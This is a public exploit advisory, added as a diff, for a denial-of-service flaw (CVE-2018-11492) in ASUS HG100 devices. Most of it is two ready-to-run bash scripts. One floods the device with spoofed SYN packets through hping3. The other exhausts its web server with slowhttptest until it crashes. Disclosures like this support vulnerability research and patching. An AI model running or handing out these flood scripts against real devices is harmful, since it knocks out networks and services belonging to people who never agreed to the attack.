@@ -1,0 +1,34 @@
+# Exploit Title:ASUS HG100 devices denial of service(DOS) via IPv4 packets/SlowHTTPDOS 
+# Date: 2019-04-14 # Exploit Author: YinT Wang; 
+# Vendor Homepage: www.asus.com 
+# Version: Hardware version: HG100 、Firmware version:  1.05.12   
+# Tested on: Currnet 1.05.12 
+# CVE : CVE-2018-11492
+
+1. Description 
+The attack at same Local-Network-area could crash the device via the Hping3 or Slowhttptest(which is not include in the CVE-2018-11492).
+
+2.Proof of Concept
+Just Execute the following script in kali which could crash the devices
+
+    1. IPv4 packet and in result of devices crash.which written in linux script.
+
+        #needed to co-operate with hping3 tool
+        #with the time period at least 220s which could cause web server of HG100 devices crash
+        #!/bin/bash
+        read -p "enter the ip of HG100 here " url
+        hping3 -V -c 10000 -S -w 64 --flood --rand-source $url
+        sleep 220
+        echo "Hping3 –V –c 10000 –S –w 64 –flood –rand-source $url time 220s"
+        exit 0
+
+    2.Slowhttp test and caused the devices crash.which written in linux script.
+
+        #needed to co-operate with slowhttptest tool
+        #with the time period 600s which could cause web server of HG100 devices crash
+        #!/bin/bash
+        read -p "enter the ip of HG100 with port here ex: http://x.x.x.x:123 " url
+        slowhttptest -H -R -c 10000 -l 600 -u $url
+        sleep 600
+        echo "slowhttptest -H -R -c 10000 -l 600 -u $url time 600s"
+        exit 0
